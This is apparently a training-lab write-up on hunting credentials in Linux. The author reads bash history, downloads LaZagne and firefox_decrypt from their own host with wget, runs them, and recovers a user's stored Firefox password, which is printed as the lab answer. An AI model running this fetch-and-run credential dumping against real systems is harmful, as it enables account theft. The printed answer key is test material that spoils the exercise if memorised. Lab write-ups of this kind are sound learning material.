### Credential Hunting In Linux

IP: 10.129.210.221
 
---
 
### Question 1:
Examine the target and find out the password of the user Will. Then, submit the password as the answer.
 
I start off by SSH'ing to the target using the given IP, user, and password.
 
```diff
+ $ ssh kira@10.129.210.221
```
 
	kira@nix01:~$
 
I then run a few searches for configs, databases, and notes, but nothing really sticks out, so I took a look inside of the bash history file.
 
```diff
+ kira@nix01:~$ cat .bash_history
```
 
	<snip>
	firefox
	cd .mozilla/firefox/
	ls
	cd ytb95ytb.default-release/
	ls
	cat logins.json
	vim logins.json
	<snip>
 
I feel like this gives an idea for the direction in which it wants me to look, so I start downloading the tools mentioned to read stored browser credentials. I wanted to test both, so I installed both on my local machine and hosted them with a Python web server, then downloaded them in the SSH environment.
 
```diff
+ $ python3 -m http.server
+ kira@nix01:~$ wget http://10.10.14.233:8000/LaZagne-2.4.7.zip
+ kira@nix01:~$ wget http://10.10.14.233:8000/firefox_decrypt.py
+ kira@nix01:~$ unzip LaZagne-2.4.7.zip
+ kira@nix01:~$ cd LaZagne-2.4.7/Linux/
+ kira@nix01:~$ python3 laZagne.py browsers
```
 
	|====================================================================|
	|                                                                    |
	|                        The LaZagne Project                         |
	|                                                                    |
	|                          ! BANG BANG !                             |
	|                                                                    |
	|====================================================================|
 
	------------------- Firefox passwords -----------------
 
	[+] Password found !!!
	URL: https://dev.inlanefreight.com
	Login: will@inlanefreight.htb
	Password: TUqr7QfLTLhruhVbCP
 
Then I wanted to try firefox_decrypt, making sure to select the second option, since that matches what was in the bash history.
 
```diff
+ kira@nix01:~$ python3.9 firefox_decrypt.py
```
 
	Select the Mozilla profile you wish to decrypt
	1 -> lktd9y8y.default
	2 -> ytb95ytb.default-release
	2
 
	Website:   https://dev.inlanefreight.com
	Username: 'will@inlanefreight.htb'
	Password: 'TUqr7QfLTLhruhVbCP'
 
&#x1F6A9; found **TUqr7QfLTLhruhVbCP**.

